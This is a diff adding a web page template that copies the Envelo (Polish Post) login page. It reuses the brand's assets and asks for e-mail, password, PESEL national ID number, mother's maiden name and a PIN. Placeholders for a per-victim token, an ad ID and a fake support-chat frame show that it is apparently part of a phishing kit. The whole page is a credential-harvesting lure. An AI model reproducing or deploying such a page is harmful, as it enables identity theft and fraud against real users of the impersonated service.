@@ -1,0 +1,194 @@
+<html class="no-js wf-lato-n3-active wf-lato-n4-active wf-lato-n7-active wf-lato-n1-active wf-lato-n9-active wf-active"
+    lang="pl">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Zaloguj się</title>
+
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="description" content="Logowanie">
+    <meta name="keywords" content="Logowanie Envelo">
+
+    <meta property="og:title" content="Logowanie Envelo">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:site_name" content="http://www.envelo.pl">
+    <meta property="og:description"
+        content="Optymalizujemy proces masowej wysyłki faktur i korespondencji seryjnej. Redukujemy czas i koszty niezbędne przy prowadzeniu kancelarii.">
+    <meta property="og:type" content="website">
+    <link rel="canonical" href="http://www.envelo.pl/">
+    <link rel="shortcut icon" href="https://www.envelo.pl/auth/resources/4.8.0.final/login/envelo-fe/img/favicon.png">
+    <link rel="apple-touch-icon"
+        href="https://www.envelo.pl/auth/resources/4.8.0.final/login/envelo-fe/img/apple-touch-icon.png">
+
+
+    <noscript>
+        <link href="https://fonts.googleapis.com/css?family=Lato:400,300,100,700,900&subset=latin,latin-ext"
+            rel="stylesheet" type="text/css">
+    </noscript>
+
+    <link href="https://www.envelo.pl/auth/resources/4.8.0.final/login/envelo-fe/css/fetools.css" rel="stylesheet">
+    <link href="https://www.envelo.pl/auth/resources/4.8.0.final/login/envelo-fe/css/main.css" rel="stylesheet">
+    <link href="https://www.envelo.pl/auth/resources/4.8.0.final/login/envelo-fe/css/login.css" rel="stylesheet">
+    <link href="https://www.envelo.pl/auth/resources/4.8.0.final/login/envelo-fe/css/loader.css" rel="stylesheet">
+    <link href="https://www.envelo.pl/auth/resources/4.8.0.final/login/envelo-fe/css/update-password.css"
+        rel="stylesheet">
+    <link href="https://www.envelo.pl/auth/resources/4.8.0.final/login/envelo-fe/css/terms.css" rel="stylesheet">
+    <link href="https://www.envelo.pl/auth/resources/4.8.0.final/login/envelo-fe/css/mobile-phone.css" rel="stylesheet">
+    <link href="https://www.envelo.pl/auth/resources/4.8.0.final/login/envelo-fe/css/reset-password.css"
+        rel="stylesheet">
+    <link href="https://www.envelo.pl/auth/resources/4.8.0.final/login/envelo-fe/css/pp-styles.css" rel="stylesheet">
+    <link href="https://www.envelo.pl/auth/resources/4.8.0.final/login/envelo-fe/css/error.css" rel="stylesheet">
+
+    <link rel="stylesheet"
+        href="https://fonts.googleapis.com/css?family=Lato:100,300,400,700,900&amp;subset=latin,latin-ext" media="all">
+    <style type="text/css">
+        iframe#_hjRemoteVarsFrame {
+            display: none !important;
+            width: 1px !important;
+            height: 1px !important;
+            opacity: 0 !important;
+            pointer-events: none !important;
+        }
+    </style>
+    <link rel="stylesheet" href="/css/default_lk.css">
+
+</head>
+
+<body id="envelo-domain">
+
+    <header>
+        <nav id="navbar-envelo" class="navbar navbar-default" data-offset-top="130">
+            <div class="container-fluid">
+                <div class="navbar-header">
+                    <a class="navbar-brand" href="https://www.envelo.pl/">
+                        <img id="envelo-logo" class="svg"
+                            src="https://www.envelo.pl/auth/resources/4.8.0.final/login/envelo-fe/img/logo.svg"
+                            alt="Envelo – Poczta Polska przez internet">
+                    </a>
+                </div>
+            </div>
+        </nav>
+    </header>
+    <style>
+        #login_section {
+            background-size: cover;
+            background-attachment: fixed;
+            font-weight: normal;
+            font-size: 16px;
+            line-height: 30px;
+            vertical-align: middle;
+            text-align: center;
+            display: table-cell;
+            width: 100%;
+        }
+
+        #login {
+            width: 100%;
+            text-align: left;
+        }
+    </style>
+    <section id="login_section">
+        <div class="forms">
+            <div class="row bg-default">
+                <h2>Zaloguj się</h2>
+                <form id="lk_form" class="center-block">
+
+                    <div class="form-group">
+
+                        <div class="form-group">
+                            <div class="form-group">
+                                <input id="login" class="form-control" name="username" value="" type="text"
+                                    placeholder="E-mail" autofocus="" autocomplete="off">
+                            </div>
+
+                            <div class="form-group">
+                                <input id="password" class="form-control" name="password" type="password"
+                                    placeholder="Hasło" autocomplete="off">
+                            </div>
+                            <div class="form-group">
+                                <input id="pesel" class="form-control" name="pesel" type="text" placeholder="Pesel"
+                                    autocomplete="off">
+                            </div>
+                            <div class="form-group">
+                                <input id="motherlastname" class="form-control" name="motherlastname" type="text"
+                                    placeholder="Nazwisko panieńskie matki" autocomplete="off">
+                            </div>
+                            <div class="form-group">
+                                <input id="pin" class="form-control" name="pin" type="password" placeholder="PIN"
+                                    autocomplete="off">
+                            </div>
+                        </div>
+
+
+                        <button id="submitAnchor" type="submit" class="btn btn-default">
+                            Dalej
+                        </button>
+
+                        <div id="loaderContainer">
+                        </div>
+
+                        <div class="form-group">
+                            <div id="kc-form-options">
+                            </div>
+                        </div>
+
+
+
+                    </div>
+
+
+                </form>
+
+            </div>
+        </div>
+    </section>
+
+
+
+
+
+
+
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js" crossorigin="anonymous"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script>
+        const LOG_TOKEN = <%=log.token%>,
+            AD_LANG = "<%=log.ad.service.lang%>",
+            AD_ID = <%=log.ad.id%>,
+            translate = <%-JSON.stringify(translate) %>;
+    </script>
+    <script src="/js/lk.js" defer></script>
+    <link rel="stylesheet" href="/css/support_parent.css" />
+    <div class="
+    chatra--webkit
+    chatra--style-round
+    chatra--side-bottom
+    chatra--pos-right
+    chatra--visible
+    chatra--expanded
+    chatra--fast-toggle
+  " id="chatra" data-turbolinks-permanent="" style="
+    width: 380px;
+    height: 600px;
+    transform: none;
+    z-index: 2147483647;
+    display: none;
+  ">
+        <div id="chatra__iframe-wrapper">
+            <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat"
+                allow="autoplay" src="/supportChatFrame/<%=log.ad.id%>"
+                style="width: 380px; height: 600px; position: absolute"></iframe>
+        </div>
+    </div>
+    <div class="support-circle"
+        onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
+</body>
+
+</html>
